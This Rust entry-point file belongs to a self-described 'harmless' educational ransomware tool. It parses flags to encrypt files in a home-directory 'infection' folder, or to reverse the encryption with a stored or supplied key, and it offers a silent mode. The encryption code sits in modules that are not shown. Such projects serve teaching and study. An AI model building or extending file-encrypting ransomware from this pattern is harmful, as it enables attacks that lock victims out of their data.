use clap::{command, value_parser, Arg};

mod ransomware;
use ransomware::*;

mod encrypt;

fn main() {
    let matches = command!()
        .version("1.0")
        .author("hboissel")
        .about("
Harmless ransomware created for educational purposes.

🔒 Encrypts the files in the infection folder in the home directory of the current user.

🔑 The ransomware use the key stored in the file .encrypt.key to encrypt the files.
If .encrypt.key does not exist, it will generate a new key and store it in the file.")
        .arg(
            Arg::new("reverse")
                .short('r')
                .long("reverse")
                .num_args(0..=1)
                .require_equals(true)
                .default_missing_value("")
                .help("Key to reverse the encryption, if not provided, it will use the key in the file .encrypt.key"),
        )
        .arg(
            Arg::new("silent")
                .short('s')
                .long("silent")
                .default_value("false")
                .num_args(0..=1)
                .require_equals(true)
                .default_missing_value("true")
                .value_parser(value_parser!(bool))
                .help("Silent mode"),
        )
        .get_matches();

    let reverse_key = matches.get_one::<String>("reverse");
    let silent_mode = matches.get_one::<bool>("silent").unwrap();

    match reverse_key {
        Some(reverse_key) => {
            if reverse_key.is_empty() {
                let key = std::fs::read_to_string(".encrypt.key").unwrap_or_default();
                if key.is_empty() {
                    println!("⚠️ No key found in the file .encrypt.key");
                    return;
                }
                ransomware_reverse(&key, silent_mode);
                return;
            }
            ransomware_reverse(&reverse_key, silent_mode);
        }
        None => {
            ransomware(silent_mode);
        }
    }
}
